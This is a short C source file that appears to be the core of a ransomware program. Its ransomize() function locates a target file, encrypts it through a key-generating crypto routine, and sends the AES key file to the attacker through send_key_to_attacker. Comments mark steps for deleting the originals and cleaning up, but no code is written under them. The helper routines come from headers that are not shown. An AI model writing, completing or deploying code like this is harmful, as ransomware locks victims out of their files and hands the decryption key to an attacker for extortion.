#include "attack.h"
#include "attack_crypto.h"
#include "get_relative_path.h"
#include "attack_web.h"
#include <stdio.h>

int ransomize(void)
{
    /* Target files */
    char important[MAX_PATH];
    if (get_relative_path(important, sizeof(important), "important.pdf") != 0) {
        return 1;
    }

    /* Generate key, encrypt files and key */
    attack_crypto(important);
    
    crypto_cleanup();

    /* Delete original files */
    
    /* Handle remote actions */
    char aes_key_path[MAX_PATH];
    if (get_relative_path(aes_key_path, sizeof(aes_key_path), "aes_key.bin") == 0) {
        send_key_to_attacker(aes_key_path);
    }

    /* Cleanup */

    return 0;
}
